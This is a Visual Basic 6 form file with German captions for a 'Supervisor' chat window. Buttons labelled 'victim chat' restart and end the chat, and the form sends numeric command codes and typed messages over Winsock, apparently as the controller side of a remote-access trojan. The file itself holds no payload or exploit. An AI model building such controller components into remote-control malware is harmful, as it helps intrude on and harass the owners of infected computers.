VERSION 5.00
Begin VB.Form Chat 
   BorderStyle     =   1  'Fest Einfach
   Caption         =   "Supervisor  -  Chat"
   ClientHeight    =   5115
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   6735
   Icon            =   "frmchat.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5115
   ScaleWidth      =   6735
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'Bildschirmmitte
   Begin VB.CommandButton Command2 
      Caption         =   "Opfer-Chat beenden"
      Height          =   555
      Left            =   3840
      TabIndex        =   3
      Top             =   4380
      Width           =   2295
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Opfer-Chat neustarten"
      Height          =   555
      Left            =   540
      TabIndex        =   2
      Top             =   4380
      Width           =   2295
   End
   Begin VB.ListBox lstChat 
      Height          =   3765
      Left            =   120
      TabIndex        =   1
      Top             =   120
      Width           =   6495
   End
   Begin VB.TextBox txtChat 
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Top             =   3960
      Width           =   6495
   End
   Begin VB.Image Image1 
      Height          =   480
      Left            =   3120
      Picture         =   "frmchat.frx":0442
      Top             =   4410
      Width           =   480
   End
End
Attribute VB_Name = "Chat"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False



Private Sub Command1_Click()
Server.wsoWinsock.SendData ("21")
End Sub

Private Sub Command2_Click()
Server.wsoWinsock.SendData ("29")
End Sub

Private Sub Form_Unload(Cancel As Integer)
'Server.wsoWinsock.SendData ("29")
End Sub

Private Sub txtChat_KeyPress(KeyAscii As Integer)
If KeyAscii = vbKeyReturn Then
    Server.wsoWinsock.SendData ("24 " + "@Supervisor: " + txtChat.Text)
    lstChat.AddItem "@Supervisor: " + txtChat.Text
    txtChat.Text = ""
    lstChat.ListIndex = lstChat.ListCount - 1
End If
End Sub
